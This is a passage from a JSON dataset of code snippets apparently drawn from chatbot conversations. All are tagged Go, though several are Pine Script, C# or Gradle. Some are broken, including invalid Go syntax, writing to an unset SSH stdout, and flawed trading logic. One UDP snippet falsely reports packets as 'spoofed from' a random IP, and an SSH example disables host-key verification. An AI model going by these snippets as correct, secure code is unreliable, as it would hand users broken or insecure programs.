    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nfunc main() {\n\turl := \"https://api.example.com/general-info-vulnerabilities\" // Replace with the Meant SCA General Info Vulnerabilities API endpoint\n\n\tclient := &http.Client{}\n\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating request:\", err)\n\t\treturn\n\t}\n\n\treq.Header.Add(\"Authorization\", \"Bearer YOUR_API_KEY\") // Replace with your bearer token\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error sending request:\", err)\n\t\treturn\n\t}\n\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Error reading response body:\", err)\n\t\treturn\n\t}\n\n\t// Parse the response or handle errors accordingly\n\t// ...\n\n\t// Example: printing the response body\n\tfmt.Println(string(body))\n}",
    "filename": "4c5f188cd0c32b4300b2bc98a79e48d9_3.go"
  },
  {
    "conversation_hash": "4ab61b4a7855bb8dce0aca3850ec94fd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Place Order After 50 Candles\", overlay = true)\n\n// Inputs\nstopLossPercentage = input(2, \"Stop Loss Percentage\") / 100\ntakeProfitPercentage = input(2, \"Take Profit Percentage\") / 100\n\n// Track the number of candles since the last trigger\nvar int candlesSinceLastTrigger = 0\n\n// Calculate the stop loss and take profit levels\nstopLossLevel = strategy.position_avg_price * (1 - stopLossPercentage)\ntakeProfitLevel = strategy.position_avg_price * (1 + takeProfitPercentage)\n\n// Check if we need to place a new order\nif strategy.position_size == 0 or strategy.closedtrades.size > 0\n    candlesSinceLastTrigger := candlesSinceLastTrigger + 1\n    if candlesSinceLastTrigger >= 50\n        strategy.entry(\"Buy\", strategy.long)\n        candlesSinceLastTrigger := 0\n        strategy.exit(\"Sell\", \"Buy\", stop = stopLossLevel, limit = takeProfitLevel)",
    "filename": "4ab61b4a7855bb8dce0aca3850ec94fd_0.go"
  },
  {
    "conversation_hash": "4ab61b4a7855bb8dce0aca3850ec94fd",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Place Order After 1 Hour\", overlay = true)\n\n// Inputs\nstopLossPercentage = input(2, \"Stop Loss Percentage\") / 100\ntakeProfitPercentage = input(2, \"Take Profit Percentage\") / 100\n\n// Track the time since the last trigger\nvar int timeSinceLastTrigger = 0\n\n// Calculate the stop loss and take profit levels\nstopLossLevel = strategy.position_avg_price * (1 - stopLossPercentage)\ntakeProfitLevel = strategy.position_avg_price * (1 + takeProfitPercentage)\n\n// Check if we need to place a new order\nif strategy.position_size == 0 or strategy.closedtrades.size > 0\n    timeSinceLastTrigger := timeSinceLastTrigger + 1\n    if timeSinceLastTrigger >= (60 * 60) // 1 hour in seconds\n        strategy.entry(\"Buy\", strategy.long)\n        timeSinceLastTrigger := 0\n        strategy.exit(\"Sell\", \"Buy\", stop = stopLossLevel, limit = takeProfitLevel)",
    "filename": "4ab61b4a7855bb8dce0aca3850ec94fd_1.go"
  },
  {
    "conversation_hash": "4ab61b4a7855bb8dce0aca3850ec94fd",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Buy in Opposite Position on Loss\", overlay = true, default_qty_type = strategy.cash, default_qty_value = 100)\n\n// Inputs\nstopLossPercentage = input(2, \"Stop Loss Percentage\") / 100\ntakeProfitPercentage = input(2, \"Take Profit Percentage\") / 100\n\n// Track the profit/loss of the current position\nvar float pnl = na\n\n// Calculate the stop loss and take profit levels\nstopLossLevel = strategy.position_avg_price * (1 - stopLossPercentage)\ntakeProfitLevel = strategy.position_avg_price * (1 + takeProfitPercentage)\n\n// Check if we need to place a new order\nif strategy.position_size == 0 or strategy.closedtrades.size > 0\n    pnl := na\nelse\n    pnl := strategy.openprofit\n\nif pnl < 0\n    strategy.close_all()\n    strategy.entry(\"Buy Long\", strategy.long)\n\nif strategy.position_size > 0\n    strategy.exit(\"Sell Long\", \"Buy Long\", stop = stopLossLevel, limit = takeProfitLevel)\nelse if strategy.position_size < 0\n    var float shortStopLossLevel = strategy.position_avg_price * (1 + stopLossPercentage)\n    var float shortTakeProfitLevel = strategy.position_avg_price * (1 - takeProfitPercentage)\n    strategy.exit(\"Cover Short\", \"Sell Short\", stop = shortStopLossLevel, limit = shortTakeProfitLevel)",
    "filename": "4ab61b4a7855bb8dce0aca3850ec94fd_2.go"
  },
  {
    "conversation_hash": "fcef4aa74ca31d158a24e1b869759d85",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "SSH"
    ],
    "code": "package main\n\nimport (\n    \"golang.org/x/crypto/ssh\"\n    \"log\"\n)\n\nfunc main() {\n    // SSH client configuration\n    config := &ssh.ClientConfig{\n        User: \"username\",\n        Auth: []ssh.AuthMethod{\n            ssh.Password(\"password\"),\n        },\n        HostKeyCallback: ssh.InsecureIgnoreHostKey(),\n    }\n\n    // SSH client connection\n    client, err := ssh.Dial(\"tcp\", \"hostname:port\", config)\n    if err != nil {\n        log.Fatalf(\"Failed to dial: %s\", err)\n    }\n    defer client.Close()\n\n    // SSH new session\n    session, err := client.NewSession()\n    if err != nil {\n        log.Fatalf(\"Failed to create session: %s\", err)\n    }\n    defer session.Close()\n\n    // Send data to the client's screen\n    session.Stdout.Write([]byte(\"Hello from SSH server!\\n\"))\n}",
    "filename": "fcef4aa74ca31d158a24e1b869759d85_1.go"
  },
  {
    "conversation_hash": "40704342d6b278056014b8db84a5becd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"net\"\n\t\"time\"\n)\n\nconst (\n\tdestIP   = \"192.168.0.1\" // Replace it with the destination IP\n\tdestPort = 1234          // Replace it with the destination port number\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\n\tspoofedIP := randomIP()\n\tdata := randomString(10)\n\n\tconn, err := net.Dial(\"udp\", fmt.Sprintf(\"%s:%d\", destIP, destPort))\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\tif err = conn.Write([]byte(data)); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Printf(\"Sent UDP packet to %s:%d, spoofed from %s\\n\", destIP, destPort, spoofedIP)\n}\n\nfunc randomString(length int) string {\n\tvar letters = []rune(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\")\n\tstr := make([]rune, length)\n\tfor i := range str {\n\t\tstr[i] = letters[rand.Intn(len(letters))]\n\t}\n\treturn string(str)\n}\n\nfunc randomIP() string {\n\treturn fmt.Sprintf(\"%d.%d.%d.%d\", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))\n}",
    "filename": "40704342d6b278056014b8db84a5becd_0.go"
  },
  {
    "conversation_hash": "a22140a2339880484ba8da421b67dbed",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"bufio\"\n)\n\nfunc main() {\n    scanner := bufio.NewScanner(os.Stdin)\n    scanner.Scan()\n    s := scanner.Text()\n\n    count := make(map[rune]int)\n    for _, char := range s {\n        count[char]++\n    }\n\n    maxWords := min(count['s'], count['h'], count['e']/2, count['r']/2, count['i'], count['f'])\n\n    fmt.Println(maxWords)\n}\n\nfunc min(nums ...int) int {\n    minValue := nums[0]\n    for _, num := range nums {\n        if num < minValue {\n            minValue = num\n        }\n    }\n    return minValue\n}",
    "filename": "a22140a2339880484ba8da421b67dbed_1.go"
  },
  {
    "conversation_hash": "a22140a2339880484ba8da421b67dbed",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    var s string\n    fmt.Scan(&s)\n\n    count := make(map[rune]int)\n    for _, char := range s {\n        count[char]++\n    }\n\n    maxWords := min(count['s']/2, count['h']/2, count['e']/2, count['r']/4, count['i'], count['f'])\n\n    fmt.Println(maxWords)\n}\n\nfunc min(nums ...int) int {\n    minValue := nums[0]\n    for _, num := range nums {\n        if num < minValue {\n            minValue = num\n        }\n    }\n    return minValue\n}",
    "filename": "a22140a2339880484ba8da421b67dbed_2.go"
  },
  {
    "conversation_hash": "c31f41e3cb6e77bb68656f84abf0e4ba",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "if (UnityEngine.XR.XRDevice.model == \"Oculus Rift\")\n{\n    // Oculus Rift设备\n}\nelse if (UnityEngine.XR.XRDevice.model == \"HTC Vive\")\n{\n    // HTC Vive设备\n}\n// 其他VR设备类型的判断",
    "filename": "c31f41e3cb6e77bb68656f84abf0e4ba_1.go"
  },
  {
    "conversation_hash": "96969c44bdb3ba8315bd0a2d2e357a29",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tarr := []string{\"apple\", \"banana\", \"orange\", \"peach\"}\n\tstr := \"banana\"\n\n\texists := false\n\tfor _, v := range arr {\n\t\tif v == str {\n\t\t\texists = true\n\t\t\tbreak\n\t\t}\n\t}\n\n\tif exists {\n\t\tfmt.Println(\"字符串已存在数组中\")\n\t} else {\n\t\tfmt.Println(\"字符串不存在数组中\")\n\t}\n}",
    "filename": "96969c44bdb3ba8315bd0a2d2e357a29_0.go"
  },
  {
    "conversation_hash": "54c89e92e4ccd7a06231bc7a59098577",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\nimport \"syscall\"\n\nfunc main() {\n\t// 加载 DLL\n\tdll := syscall.MustLoadDLL(\"myLib.dll\")\n\n\t// 获取函数地址\n\tmyFunction := dll.MustFindProc(\"myFunction\")\n\n\t// 调用函数\n\t_, _, _ := myFunction.Call()\n\n\t// 打印结果\n\tfmt.Println(\"Function called\")\n}",
    "filename": "54c89e92e4ccd7a06231bc7a59098577_8.go"
  },
  {
    "conversation_hash": "54c89e92e4ccd7a06231bc7a59098577",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n\t\"syscall\"\n)\n\nfunc main() {\n\t// 加载 DLL\n\tdll := syscall.MustLoadDLL(\"myLib.dll\")\n\n\t// 获取函数地址\n\tmyFunction := dll.MustFindProc(\"myFunction\")\n\n\t// 准备参数\n\tparam := \"Hello, DLL\"\n\tparamPtr := unsafe.Pointer(syscall.StringToUTF16Ptr(param))\n\n\t// 调用函数\n\t_, _, _ := myFunction.Call(uintptr(paramPtr))\n\n\t// 打印结果\n\tfmt.Println(\"Function called with param:\", param)\n}",
    "filename": "54c89e92e4ccd7a06231bc7a59098577_9.go"
  },
  {
    "conversation_hash": "54c89e92e4ccd7a06231bc7a59098577",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tfor {\n\t\t// 执行你的逻辑代码\n\t\tfmt.Println(\"执行循环\")\n\n\t\t// 暂停一秒\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}",
    "filename": "54c89e92e4ccd7a06231bc7a59098577_10.go"
  },
  {
    "conversation_hash": "2975cd61c558bd5a6eb6ccfd09caaa94",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"strings\"\n\t\"path/filepath\"\n)\n\nvar ogonki = map[string]string{\n\t\"pl\": \"ąćęłńóśźżĄĆĘŁŃÓŚŹŻ\",\n\t\"cz\": \"áčďéěíňóřšťúůýžÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ\",\n}\n\nvar diacriticMappings = map[string]string{\n\t\"ą\": \"a\", \"á\": \"a\", \"ć\": \"c\", \"č\": \"c\", \"ę\": \"e\", \"é\": \"e\", \"ě\": \"e\",\n\t\"ś\": \"s\", \"š\": \"s\", \"Á\": \"A\", \"Ą\": \"A\", \"ž\": \"z\", \"ż\": \"z\", \"ź\": \"z\",\n}\n\nfunc main() {\n\tflagHelp := flag.Bool(\"help\", false, \"View Help\")\n\tflagLang := flag.String(\"lang\", \"pl\", \"The language of diacritic marks: \\n (pl, de, fr, es, it, cz, hu, dk, no, fi, el, ro, et, lt, lv, sk, vi, sl, hr, ro, is, mt, sr, nl, al, ba, pt, tr, la, cy, gl, ku, br, fo, fy, gd, gl,  hsb, ga, csb, ca, kw, crh, lb, ro, rom, it, gd, )\")\n\n\tflag.Parse()\n\n\tif *flagHelp {\n\t\tprintHelp()\n\t\treturn\n\t}\n\n\tinputFiles := flag.Args()\n\n\tif len(inputFiles) == 0 {\n\t\tfmt.Println(\"OGONKI => Error: No file path specified. \\nDisplaying help: OGONKI -help\")\n\t\treturn\n\t}\n\n\tfor _, inputFile := range inputFiles {\n\t\tfileExt := strings.ToLower(filepath.Ext(inputFile))\n\t\tswitch fileExt {\n\t\tcase \".txt\", \".srt\", \".yml\":\n\t\t\tcontent, err := ioutil.ReadFile(inputFile)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Printf(\"Error loading file %s: %s\\n\", inputFile, err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tnewContent := replaceOgonki(string(content), *flagLang)\n\t\t\toutputFile := strings.TrimSuffix(inputFile, fileExt) + \"_modified\" + fileExt\n\n\t\t\terr = ioutil.WriteFile(outputFile, []byte(newContent), 0644)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Printf(\"Error for adding support access paths %s: %s\\n\", outputFile, err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tfmt.Printf(\"Diacritics swap completed successfully. \\nNew file saved as %s.\\n\", outputFile)\n\t\tdefault:\n\t\t\tfmt.Printf(\"Unsupported file format: %s\\n\", fileExt)\n\t\t}\n\t}\n}\n\nfunc replaceOgonki(text string, lang string) string {\n\togonkiLetters, ok := ogonki[lang]\n\tif !ok {\n\t\tfmt.Printf(\"Error: Unknown diacritics language %s.\\n\", lang)\n\t\treturn text\n\t}\n\n\tfor _, ogonkiLetter := range ogonkiLetters {\n\t\treplacement := getReplacement(string(ogonkiLetter))\n\t\ttext = strings.ReplaceAll(text, string(ogonkiLetter), replacement)\n\t}\n\treturn text\n}\n\nfunc getReplacement(letter string) string {\n\treplacement, ok := diacriticMappings[letter]\n\tif ok {\n\t\treturn replacement\n\t}\n\treturn letter\n}\n\nfunc printHelp() {\n\tfmt.Println()\n}",
    "filename": "2975cd61c558bd5a6eb6ccfd09caaa94_0.go"
  },
  {
    "conversation_hash": "5d5d5c4b1b7d51a47b3c0e8cff7593ce",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "dependencyResolutionManagement {\n       repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)\n       repositories {\n           google()\n           mavenCentral()\n       }\n       dependencies {\n           ...\n           // اضافه کردن وابستگی ها\n           implementation 'androidx.lifecycle:lifecycle-runtime:2.4.1'\n           implementation 'androidx.lifecycle:lifecycle-extensions:2.2.0'\n       }\n   }",
    "filename": "5d5d5c4b1b7d51a47b3c0e8cff7593ce_0.go"
  },
  {
    "conversation_hash": "6d08cb27997de09013b83c5a85ace609",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sort\"\n)\n\nfunc main() {\n\treplacements := map[string]string{\n\t\t\"f̈\": \"f\", \"φ\": \"f\", \"ḟ\": \"f\", \"F̈\": \"F\", \"Φ\": \"F\", \"Ḟ\": \"F\",\n\t\t\"ģ\": \"g\", \"ġ\": \"g\", \"γ\": \"g\", \"ğ\": \"g\", \"g̈\": \"g\", \"Ģ\": \"G\", \"Ġ\": \"G\", \"Γ\": \"G\", \"Ğ\": \"G\", \"Ǧ\": \"G\", \"G̈\": \"G\",\n\t\t\"ȟ\": \"h\", \"ħ\": \"h\", \"ḥ\": \"h\", \"Ȟ\": \"H\", \"Ħ\": \"H\", \"Ḥ\": \"H\",\n\t\t\"į\": \"i\", \"i̇\": \"i\", \"ì\": \"i\", \"í\": \"i\", \"î\": \"i\", \"î\": \"i\", \"ï\": \"i\", \"ĩ\": \"i\", \"ỉ\": \"i\", \"ị\": \"i\", \"ī\": \"i\", \"ι\": \"i\", \"ı\": \"i\", \"ǐ\": \"i\", \"i̱\": \"i\", \"ï̂\": \"i\", \"i̧\": \"i\", \"ĭ\": \"i\", \"ȋ\": \"i\", \"ị̄\": \"i\", \"į́\": \"i\", \"į̃\": \"i\", \"ï̈\": \"i\", \"ị̈\": \"i\", \"ɨ\": \"i\", \"ɨ̄\": \"i\", \"ɨ̈\": \"i\", \"į̇\": \"i\", \"Į\": \"I\", \"İ\": \"I\", \"Ì\": \"I\", \"Í\": \"I\", \"Î\": \"I\", \"Ï\": \"I\", \"Ĩ\": \"I\", \"Ỉ\": \"I\", \"Ị\": \"I\", \"Ī\": \"I\", \"Ǐ\": \"I\", \"I̱\": \"I\", \"Ï̂\": \"I\", \"I̧\": \"I\", \"Ĭ\": \"I\", \"Ȋ\": \"I\", \"Ī\": \"I\", \"Į́\": \"I\", \"Į̣̃\": \"I\", \"Į̇\": \"I\",\n\t\t\"ǰ\": \"j\", \"ь\": \"j\", \"ĵ\": \"j\", \"j́\": \"j\", \"Ь\": \"J\", \"Ĵ\": \"J\", \"J́\": \"J\",\n\t\t\"κ\": \"k\", \"ķ\": \"k\", \"ḳ\": \"k\", \"Ķ\": \"K\", \"Ḳ\": \"K\",\n\t\t\"ĺ\": \"l\", \"ľ\": \"l\", \"ļ\": \"l\", \"ł\": \"l\", \"λ\": \"l\", \"Ĺ\": \"L\", \"Ľ\": \"L\", \"Ļ\": \"L\", \"Ł\": \"L\", \"Λ\": \"L\",\n\t\t\"ḿ\": \"m\", \"μ\": \"m\", \"ṁ\": \"m\", \"Ḿ\": \"M\", \"Ṁ\": \"M\",\n\t}\n\n\t// Sortowanie i utworzenie posortowanego slice\n\tvar sortedKeys []string\n\tfor k := range replacements {\n\t\tsortedKeys = append(sortedKeys, k)\n\t}\n\tsort.Strings(sortedKeys)\n\n\t// Wydrukowanie posortowanych kluczy i wartości\n\tfor _, k := range sortedKeys {\n\t\tfmt.Println(k, \"-\", replacements[k])\n\t}\n}",
    "filename": "6d08cb27997de09013b83c5a85ace609_0.go"
  },
  {
    "conversation_hash": "7bff95536b19e4edefa9358010efd261",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tnumbers := []int{1, 2, 3, 4, 5}\n\n\t// Iterating over a collection using 'for _'\n\tfor _, num := range numbers {\n\t\tfmt.Println(num)\n\t}\n\n\t// Ignoring the iteration variable using 'for _'\n\tfor i := 0; i < 5; i++ {\n\t\tfmt.Println(\"Iteration\", i+1)\n\t}\n}",
    "filename": "7bff95536b19e4edefa9358010efd261_0.go"
  },
  {
    "conversation_hash": "09de7dfa6625a79c04206ced960326db",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "archive"
    ],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n)\n\nfunc main() {\n\tkey := flag.String(\"k\", \"\", \"Encryption key\")\n\taddFile := flag.String(\"a\", \"\", \"Add file to archive\")\n\tdeleteFile := flag.String(\"d\", \"\", \"Delete file from archive\")\n\tselfExtracting := flag.Bool(\"s\", false, \"Make a self-extracting archive\")\n\tupdateFile := flag.String(\"u\", \"\", \"Update file to archive\")\n\tmoveFile := flag.String(\"m\", \"\", \"Move new file into archive\")\n\textractFiles := flag.Bool(\"e\", false, \"Extract files from archive\")\n\tviewFiles := flag.Bool(\"l\", false, \"View list of files in archive\")\n\ttestArchive := flag.Bool(\"t\", false, \"Test integrity of archive\")\n\thelp := flag.Bool(\"h\", false, \"View help screen\")\n\n\tflag.Parse()\n\n\tif *help {\n\t\tprintHelp()\n\t\treturn\n\t}\n\n\tif *key == \"\" {\n\t\tlog.Fatal(\"Please provide the encryption key\")\n\t}\n\n\tif *addFile != \"\" {\n\t\taddToFile(*addFile, *key)\n\t}\n\n\tif *deleteFile != \"\" {\n\t\tdeleteFromFile(*deleteFile, *key)\n\t}\n\n\tif *selfExtracting {\n\t\tcreateSelfExtractingArchive(*key)\n\t}\n\n\tif *updateFile != \"\" {\n\t\tupdateFileInArchive(*updateFile, *key)\n\t}\n\n\tif *moveFile != \"\" {\n\t\tmoveNewFileIntoArchive(*moveFile, *key)\n\t}\n\n\tif *extractFiles {\n\t\textractFilesFromArchive(*key)\n\t}\n\n\tif *viewFiles {\n\t\tviewListOfFilesInArchive(*key)\n\t}\n\n\tif *testArchive {\n\t\ttestIntegrityOfArchive(*key)\n\t}\n}\n\nfunc addToFile(file, key string) {\n\t// Implementacja dodawania pliku do archiwum\n\tfmt.Println(\"Adding file:\", file)\n}\n\nfunc deleteFromFile(file, key string) {\n\t// Implementacja usuwania pliku z archiwum\n\tfmt.Println(\"Deleting file:\", file)\n}\n\nfunc createSelfExtractingArchive(key string) {\n\t// Implementacja tworzenia archiwum z samodzielnie rozpakowującym się programem\n\tfmt.Println(\"Creating self-extracting archive\")\n}\n\nfunc updateFileInArchive(file, key string) {\n\t// Implementacja aktualizacji pliku w archiwum\n\tfmt.Println(\"Updating file:\", file)\n}\n\nfunc moveNewFileIntoArchive(file, key string) {\n\t// Implementacja przenoszenia nowego pliku do archiwum\n\tfmt.Println(\"Moving file:\", file)\n}\n\nfunc extractFilesFromArchive(key string) {\n\t// Implementacja wypakowywania plików z archiwum\n\tfmt.Println(\"Extracting files\")\n}\n\nfunc viewListOfFilesInArchive(key string) {\n\t// Implementacja wyświetlania listy plików w archiwum\n\tfmt.Println(\"Viewing list of files\")\n}\n\nfunc testIntegrityOfArchive(key string) {\n\t// Implementacja sprawdzania integralności archiwum\n\tfmt.Println(\"Testing integrity of archive\")\n}\n\nfunc printHelp() {\n\tfmt.Println(\"Usage: program -k KEY [-a FILE] [-d FILE] [-s] [-u FILE] [-m FILE] [-e] [-l] [-t] [-h]\")\n\tfmt.Println(\"Options:\")\n\tfmt.Println(\"  -k KEY\\t\\tEncryption key (required)\")\n\tfmt.Println(\"  -a FILE\\t\\tAdd file to archive\")\n\tfmt.Println(\"  -d FILE\\t\\tDelete file from archive\")\n\tfmt.Println(\"  -s\\t\\t\\tMake a self-extracting archive\")\n\tfmt.Println(\"  -u FILE\\t\\tUpdate file to archive\")\n\tfmt.Println(\"  -m FILE\\t\\tMove new file into archive\")\n\tfmt.Println(\"  -e\\t\\t\\tExtract files from archive\")\n\tfmt.Println(\"  -l\\t\\t\\tView list of files in archive\")\n\tfmt.Println(\"  -t\\t\\t\\tTest integrity of archive\")\n\tfmt.Println(\"  -h\\t\\t\\tView help screen\")\n}",
    "filename": "09de7dfa6625a79c04206ced960326db_0.go"
  },
  {
    "conversation_hash": "09de7dfa6625a79c04206ced960326db",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "archive"
    ],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n)\n\nfunc main() {\n\tkey := flag.String(\"k\", \"\", \"Encryption key\")\n\taddFile := flag.String(\"a\", \"\", \"Add file to archive\")\n\tdeleteFile := flag.String(\"d\", \"\", \"Delete file from archive\")\n\tselfExtracting := flag.Bool(\"s\", false, \"Make a self-extracting archive\")\n\tupdateFile := flag.String(\"u\", \"\", \"Update file in archive\")\n\tmoveFile := flag.String(\"m\", \"\", \"Move new file into archive\")\n\textractFiles := flag.Bool(\"e\", false, \"Extract files from archive\")\n\tviewFiles := flag.Bool(\"l\", false, \"View list of files in archive\")\n\ttestArchive := flag.Bool(\"t\", false, \"Test integrity of archive\")\n\thelp := flag.Bool(\"h\", false, \"View help screen\")\n\n\tflag.Parse()\n\n\tif *help {\n\t\tprintHelp()\n\t\treturn\n\t}\n\n\tif *key == \"\" {\n\t\tlog.Fatal(\"Please provide the encryption key\")\n\t}\n\n\tif *addFile != \"\" {\n\t\taddToFile(*addFile, *key)\n\t}\n\n\tif *deleteFile != \"\" {\n\t\tdeleteFromFile(*deleteFile, *key)\n\t}\n\n\tif *selfExtracting {\n\t\tcreateSelfExtractingArchive(*key)\n\t}\n\n\tif *updateFile != \"\" {\n\t\tupdateFileInArchive(*updateFile, *key)\n\t}\n\n\tif *moveFile != \"\" {\n\t\tmoveNewFileIntoArchive(*moveFile, *key)\n\t}\n\n\tif *extractFiles {\n\t\textractFilesFromArchive(*key)\n\t}\n\n\tif *viewFiles {\n\t\tviewListOfFilesInArchive(*key)\n\t}\n\n\tif *testArchive {\n\t\ttestIntegrityOfArchive(*key)\n\t}\n}\n\nfunc addToFile(file, key string) {\n\tfmt.Printf(\"Adding file: %s\\n\", file)\n\t// Kod do aktualnego dodawania pliku do archiwum\n}\n\nfunc deleteFromFile(file, key string) {\n\tfmt.Printf(\"Deleting file: %s\\n\", file)\n\t// Kod do aktualnego usuwania pliku z archiwum\n}\n\nfunc createSelfExtractingArchive(key string) {\n\tfmt.Println(\"Creating self-extracting archive\")\n\t// Kod do aktualnego tworzenia archiwum z samorozpakowującym się programem\n}\n\nfunc updateFileInArchive(file, key string) {\n\tfmt.Printf(\"Updating file: %s\\n\", file)\n\t// Kod do aktualnego aktualizowania pliku w archiwum\n}\n\nfunc moveNewFileIntoArchive(file, key string) {\n\tfmt.Printf(\"Moving file: %s\\n\", file)\n\t// Kod do aktualnego przenoszenia nowego pliku do archiwum\n}\n\nfunc extractFilesFromArchive(key string) {\n\tfmt.Println(\"Extracting files\")\n\t// Kod do aktualnego wypakowywania plików z archiwum\n}\n\nfunc viewListOfFilesInArchive(key string) {\n\tfmt.Println(\"Viewing list of files\")\n\t// Kod do aktualnego wyświetlania listy plików w archiwum\n}\n\nfunc testIntegrityOfArchive(key string) {\n\tfmt.Println(\"Testing integrity of archive\")\n\t// Kod do aktualnego sprawdzania integralności archiwum\n}\n\nfunc printHelp() {\n\tfmt.Println(\"Usage: program -k KEY [-a FILE] [-d FILE] [-s] [-u FILE] [-m FILE] [-e] [-l] [-t] [-h]\")\n\tfmt.Println(\"Options:\")\n\tfmt.Println(\"  -k KEY\\t\\tEncryption key (required)\")\n\tfmt.Println(\"  -a FILE\\t\\tAdd file to archive\")\n\tfmt.Println(\"  -d FILE\\t\\tDelete file from archive\")\n\tfmt.Println(\"  -s\\t\\t\\tMake a self-extracting archive\")\n\tfmt.Println(\"  -u FILE\\t\\tUpdate file to archive\")\n\tfmt.Println(\"  -m FILE\\t\\tMove new file into archive\")\n\tfmt.Println(\"  -e\\t\\t\\tExtract files from archive\")\n\tfmt.Println(\"  -l\\t\\t\\tView list of files in archive\")\n\tfmt.Println(\"  -t\\t\\t\\tTest integrity of archive\")\n\tfmt.Println(\"  -h\\t\\t\\tView help screen\")\n}",
    "filename": "09de7dfa6625a79c04206ced960326db_1.go"
  },
  {
    "conversation_hash": "09de7dfa6625a79c04206ced960326db",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func testIntegrityOfArchive(key string) {\n\tfmt.Println(\"Testing integrity of archive\")\n\n\t// Pobieranie listy plików w archiwum\n\tfiles := getFilesInArchive(key)\n\n\t// Sprawdzenie integralności każdego pliku w archiwum\n\tfor _, file := range files {\n\t\tif !checkIntegrity(file) {\n\t\t\tfmt.Printf(\"File '%s' is corrupt\\n\", file)\n\t\t} else {\n\t\t\tfmt.Printf(\"File '%s' is intact\\n\", file)\n\t\t}\n\t}\n}\n\n// Funkcja pomocnicza do pobierania listy plików w archiwum (zaimplementuj odpowiednio)\nfunc getFilesInArchive(key string) []string {\n\tfiles := []string{\"file1.txt\", \"file2.txt\", \"file3.txt\"} // Przykładowe dane - zastąp odpowiednią implementacją\n\n\treturn files\n}\n\n// Funkcja pomocnicza do sprawdzania integralności pliku (zaimplementuj odpowiednio)\nfunc checkIntegrity(file string) bool {\n\t// Kod do sprawdzenia integralności pliku\n\treturn true // przykładowa wartość - zastąp odpowiednią implementacją\n}",
    "filename": "09de7dfa6625a79c04206ced960326db_2.go"
  },
  {
    "conversation_hash": "09de7dfa6625a79c04206ced960326db",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func viewListOfFilesInArchive(key string) {\n\tfmt.Println(\"Viewing list of files\")\n\n\t// Pobieranie listy plików w archiwum\n\tfiles := getFilesInArchive(key)\n\n\t// Wyświetlanie listy plików\n\tfor _, file := range files {\n\t\tfmt.Println(file)\n\t}\n}\n\n// Funkcja pomocnicza do pobierania listy plików w archiwum (zaimplementuj odpowiednio)\nfunc getFilesInArchive(key string) []string {\n\tfiles := []string{\"file1.txt\", \"file2.txt\", \"file3.txt\"} // Przykładowe dane - zastąp odpowiednią implementacją\n\n\treturn files\n}",
    "filename": "09de7dfa6625a79c04206ced960326db_3.go"
  },
  {
    "conversation_hash": "6aedde2612b44a378d396ddd463e117a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
